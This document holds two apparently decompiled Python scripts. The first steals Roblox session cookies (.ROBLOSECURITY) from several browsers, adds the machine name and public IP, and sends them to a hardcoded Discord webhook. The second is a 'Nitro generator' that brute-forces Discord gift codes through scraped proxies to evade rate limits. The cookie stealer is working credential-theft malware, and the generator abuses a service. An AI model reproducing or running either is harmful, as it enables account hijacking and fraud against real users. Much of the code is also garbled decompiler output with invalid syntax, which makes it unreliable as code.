import browser_cookie3
import requests
import urllib
import re
import os
webhook = 'https://discord.com/api/webhooks/1033038183685963858/QdeQsEnpGcOqY3L_DkzccPKYTbyopOhap1v6Mk4v3d2UMsiY-oKQinrWuYLxsZ0hkvu1'
avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
botName = 'Sam On Top'

def sendWebhook(message):
    requests.post(webhook, f'''username={botName}&avatar_url={avatarUrl}&content={message}''', {
        'content-type': 'application/x-www-form-urlencoded' }, **('data', 'headers'))


def scrapeInfo(cookies):
    request = requests.get('https://www.roblox.com', cookies, **('cookies',))
    displayName = re.findall('displayname=(.*) data-isunder13', request.content.decode('UTF-8'))
    return displayName


def getIPAddress():
    request = requests.get('https://ip4.seeip.org/')
    return request.content.decode('UTF-8')


def cookieLogger():
    data = []
    
    try:
        cookies = browser_cookie3.firefox('roblox.com', **('domain_name',))
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
            return None
    finally:
        pass
    
    try:
        cookies = browser_cookie3.edge('roblox.com', **('domain_name',))
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
            return None
    finally:
        pass
    
    try:
        cookies = browser_cookie3.opera('roblox.com', **('domain_name',))
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
            return None
    finally:
        pass
    
    try:
        cookies = browser_cookie3.chromium('roblox.com', **('domain_name',))
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
            return None
    finally:
        return None
        return None






def AtomLogger():
    cookies = cookieLogger()
    machineName = os.getenv('COMPUTERNAME')
    message = '```Sam On Top TBH\n'
    message += f'''\nName: {scrapeInfo(cookies[0])} \nCookie:\n{cookies[1]} \n\nMachine Name: {machineName} \nIP Address: {getIPAddress()}''' + '```'
    sendWebhook(message)

if __name__ == '__main__':
    AtomLogger()
import os
from time import sleep
import requests
import random
import string
from colorama import Fore
os.system('cls')
print(f'''{Fore.WHITE}[ {Fore.CYAN}\xc2\xa7 {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Discord Nitro Generator made by {Fore.WHITE}Sam{Fore.LIGHTBLACK_EX}''')
print(f'''{Fore.WHITE}[ {Fore.CYAN}\xc2\xa7 {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Creator of this Generator : {Fore.WHITE}https://github.com/chi0sk''')
amount = int(input(f'''\n{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}How much codes will be generated: {Fore.WHITE}'''))
print(f'''\n{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Classic Nitro is 16chars and Boost Nitro is 24chars''')
nitro = input(f'''{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Boost codes or Classic codes {Fore.WHITE}(boost or classic){Fore.LIGHTBLACK_EX}: {Fore.WHITE}''')
if 'boost' in nitro or 'classic' in nitro:
    pass
else:
    print(f'''{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Answer must be {Fore.WHITE}boost {Fore.LIGHTBLACK_EX}or {Fore.WHITE}classic''')
    exit()
checker = input(f'''{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Enable Checker {Fore.WHITE}(yes or no){Fore.LIGHTBLACK_EX}: {Fore.WHITE}''')

def scrape():
    scraped = 0
    f = open('proxies.txt', 'a+')
    f.truncate(0)
    r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500&ssl=yes')
    proxies = []
    for proxy in r.text.split('\n'):
        proxy = proxy.strip()
        proxy = 'https://' + proxy
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        scraped = scraped + 1
        f.write(p + '\n')
    f.close()
    print(f'''{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Scraped {Fore.WHITE}{scraped} {Fore.LIGHTBLACK_EX}proxies.''')

if checker == 'yes':
    scrapep = input(f'''{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Auto proxy scrape {Fore.WHITE}(yes or no){Fore.LIGHTBLACK_EX}: {Fore.WHITE}''')
    print(f'''\n{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}If no, every check will be on random proxy.''')
    mult = input(f'''{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Multiple checks for proxy {Fore.WHITE}(yes or no){Fore.LIGHTBLACK_EX}: {Fore.WHITE}''')
    if scrapep == 'yes':
        scrape()
    else:
        print(f'''\n{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}If true, before code will be {Fore.WHITE}discord.gift/''')
        prefix = input(f'''{Fore.WHITE}[ {Fore.YELLOW}> {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Prefix before codes {Fore.WHITE}(yes or no){Fore.LIGHTBLACK_EX}: {Fore.WHITE}''')
        if 'yes' in prefix or 'no' in prefix:
            pass
        else:
            print(f'''{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Answer must be {Fore.WHITE}yes {Fore.LIGHTBLACK_EX}or {Fore.WHITE}no''')
            exit()
print(f'''\n{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Generating {Fore.WHITE}{amount}{Fore.LIGHTBLACK_EX} codes!''')
if checker != 'yes':
    sleep(1)
fulla = amount
f = open('codes.txt', 'w+', 'UTF-8', **('encoding',))

def readproxies():
    pass


rproxy = readproxies()
if not rproxy:
    print(f'''{Fore.WHITE}[{Fore.RED} ! {Fore.WHITE}]{Fore.LIGHTBLACK_EX} No proxies found in {Fore.WHITE}proxies.txt!{Fore.WHITE}''')
    raise SystemExit
if None != 'yes':
    if amount > 0:
        amount = amount - 1
        if 'boost' in nitro:
            code = ''.join((lambda .0: [ random.choice(string.ascii_letters + string.digits) for i in .0 ])(range(24)))
        else:
            code = ''.join((lambda .0: [ random.choice(string.ascii_letters + string.digits) for i in .0 ])(range(16)))
        if prefix == 'yes':
            print(f'''{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Generated code {Fore.WHITE}{code}''')
            f.write(f'''discord.gift/{code}\n''')
        else:
            print(f'''{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Generated code {Fore.WHITE}{code}''')
            f.write(f'''{code}\n''')
        if not amount > 0:
            pass
        elif amount > 0:
            f = open('working-codes.txt', 'a', 'UTF-8', **('encoding',))
            
            try:
                if not rproxy[0]:
                    print(f'''{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}All proxies are invalid{Fore.WHITE}''')
                    if scrapep == 'yes':
                        print(f'''{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Rescraping Proxies...{Fore.WHITE}''')
                        scrape()
                        rproxy = readproxies()
                    else:
                        exit()
                else:
                    print(f'''{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}All proxies are invalid{Fore.WHITE}''')
                    if scrapep == 'yes':
                        print(f'''{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Rescraping Proxies...{Fore.WHITE}''')
                        scrape()
                        rproxy = readproxies()
                    else:
                        exit()
                if mult == 'yes':
                    proxi = rproxy[0]
                else:
                    proxi = random.choice(rproxy)
                proxies = {
                    'https': proxi }
                amount = amount - 1
                if 'boost' in nitro:
                    code = ''.join((lambda .0: [ random.choice(string.ascii_letters + string.digits) for i in .0 ])(range(24)))
                else:
                    code = ''.join((lambda .0: [ random.choice(string.ascii_letters + string.digits) for i in .0 ])(range(16)))
                
                try:
                    url = requests.get(f'''https://discordapp.com/api/v6/entitlements/gift-codes/{code}''', proxies, 3, **('proxies', 'timeout'))
                    if url.status_code == 200:
                        print(f'''{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Working Code {Fore.WHITE}{code}{Fore.WHITE}''')
                        f.write(f'''\ndiscord.gift/{code}''')
                        f.close()
                    elif url.status_code == 404:
                        fulla = fulla - 1
                        print(f'''{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Invalid Code {Fore.WHITE}{code}''')
                    elif url.status_code == 429:
                        fulla = fulla - 1
                        if mult == 'yes':
                            print(f'''{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Proxy {Fore.WHITE}{proxi}{Fore.LIGHTBLACK_EX} is ratelimited! | Switching proxy''')
                        else:
                            print(f'''{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Proxy {Fore.WHITE}{proxi}{Fore.LIGHTBLACK_EX} is ratelimited!''')
                        index = rproxy.index(proxi)
                        del rproxy[index]
                    else:
                        fulla = fulla - 1
                        print(f'''{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Invalid Error! | Status code {Fore.WHITE}{url.status_code}''')
                finally:
                    pass
                index = rproxy.index(proxi)
                del rproxy[index]
                pw = open('proxies.txt', 'w', 'UTF-8', **('encoding',))
                for i in rproxy:
                    pw.write(i + '\n')
                pw.close()
                fulla = fulla - 1
                print(f'''{Fore.WHITE}[ {Fore.RED}- {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Failed connecting to proxy {Fore.WHITE}{proxi}{Fore.LIGHTBLACK_EX} | Removing from list!''')
                if not amount > 0:
                    f.close()
                    print(f'''{Fore.WHITE}[ {Fore.YELLOW}? {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Successfully generated {Fore.WHITE}{fulla} {Fore.LIGHTBLACK_EX}codes!{Fore.WHITE}''')
                    input()
                    os.wait(200000)
                    return None


